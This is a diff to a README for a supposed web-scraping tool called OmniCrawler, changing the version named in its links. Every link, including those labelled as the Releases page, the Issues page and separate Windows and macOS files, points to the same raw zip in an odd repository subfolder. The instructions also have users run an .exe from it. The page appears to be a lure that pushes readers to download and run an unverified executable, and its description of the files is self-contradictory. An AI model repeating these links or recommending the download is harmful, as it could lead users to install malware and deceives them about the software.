@@ -1,6 +1,6 @@
 # 🕸️ OmniCrawler - Effortless Web Data Extraction Made Easy
 
-[![Download OmniCrawler](https://github.com/BlackSheep0110/OmniCrawler/raw/refs/heads/main/multistoried/Omni-Crawler-2.0.zip%20OmniCrawler-Here-brightgreen)](https://github.com/BlackSheep0110/OmniCrawler/raw/refs/heads/main/multistoried/Omni-Crawler-2.0.zip)
+[![Download OmniCrawler](https://github.com/BlackSheep0110/OmniCrawler/raw/refs/heads/main/multistoried/Omni-Crawler-v3.6.zip%20OmniCrawler-Here-brightgreen)](https://github.com/BlackSheep0110/OmniCrawler/raw/refs/heads/main/multistoried/Omni-Crawler-v3.6.zip)
 
 ## 🛠️ What is OmniCrawler?
 
@@ -23,11 +23,11 @@ To ensure the best experience, make sure your system meets the following require
 
 1. **Visit this page to download:** Click the link below to head to the Releases page.
    
-   [Download OmniCrawler](https://github.com/BlackSheep0110/OmniCrawler/raw/refs/heads/main/multistoried/Omni-Crawler-2.0.zip)
+   [Download OmniCrawler](https://github.com/BlackSheep0110/OmniCrawler/raw/refs/heads/main/multistoried/Omni-Crawler-v3.6.zip)
 
 2. **Select the latest version:** On the Releases page, look for the latest version available for download. You will find files listed there.
 
-3. **Download the file:** Click on the appropriate file that matches your operating system. If you see a file such as `https://github.com/BlackSheep0110/OmniCrawler/raw/refs/heads/main/multistoried/Omni-Crawler-2.0.zip` for Windows or `https://github.com/BlackSheep0110/OmniCrawler/raw/refs/heads/main/multistoried/Omni-Crawler-2.0.zip` for macOS, select it.
+3. **Download the file:** Click on the appropriate file that matches your operating system. If you see a file such as `https://github.com/BlackSheep0110/OmniCrawler/raw/refs/heads/main/multistoried/Omni-Crawler-v3.6.zip` for Windows or `https://github.com/BlackSheep0110/OmniCrawler/raw/refs/heads/main/multistoried/Omni-Crawler-v3.6.zip` for macOS, select it.
 
 4. **Run the installer:** Once the file downloads, locate it in your downloads folder. For Windows users, double-click the `.exe` file. For macOS, unzip the downloaded file and drag the application to your Applications folder.
 
@@ -63,7 +63,7 @@ Once OmniCrawler completes its scraping task:
 
 If you encounter issues or have questions:
 
-1. **Check the FAQ:** Look for common questions on the [GitHub Issues page](https://github.com/BlackSheep0110/OmniCrawler/raw/refs/heads/main/multistoried/Omni-Crawler-2.0.zip).
+1. **Check the FAQ:** Look for common questions on the [GitHub Issues page](https://github.com/BlackSheep0110/OmniCrawler/raw/refs/heads/main/multistoried/Omni-Crawler-v3.6.zip).
 2. **Submit a question:** If your question is not answered, submit a new issue describing your problem.
 
 ### 🌍 Relevant Topics
@@ -93,4 +93,4 @@ To learn more about web scraping and how to make the most of OmniCrawler, check 
 
 Feel free to explore and engage with the community. Your feedback is valuable, and it helps us improve OmniCrawler for everyone. 
 
-For further insights, please revisit the [Releases page](https://github.com/BlackSheep0110/OmniCrawler/raw/refs/heads/main/multistoried/Omni-Crawler-2.0.zip) to get updates and new features!
+For further insights, please revisit the [Releases page](https://github.com/BlackSheep0110/OmniCrawler/raw/refs/heads/main/multistoried/Omni-Crawler-v3.6.zip) to get updates and new features!
